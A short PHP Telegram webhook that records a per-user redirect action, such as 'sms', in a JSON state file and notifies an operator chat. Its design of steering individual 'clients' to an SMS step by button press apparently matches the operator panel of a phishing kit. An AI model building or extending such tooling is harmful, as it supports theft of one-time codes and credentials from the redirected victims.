<?php
include 'poder.php';

$data = json_decode(file_get_contents("php://input"), true);

if (isset($data['callback_query'])) {
    $info = explode(":", $data['callback_query']['data']); // redirigir:sms:usuario
    $tipo = $info[1];
    $usuario = $info[2];

    $estados = [];
    $archivo = 'estado_clientes.json';
    if (file_exists($archivo)) {
        $estados = json_decode(file_get_contents($archivo), true);
    }

    $estados[$usuario] = ['accion' => $tipo];
    file_put_contents($archivo, json_encode($estados));

    $callback_id = $data['callback_query']['id'];
    file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callback_id&text=Redirigiendo...");

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => "➡️ Cliente $usuario redirigido a $tipo"
    ]));
}
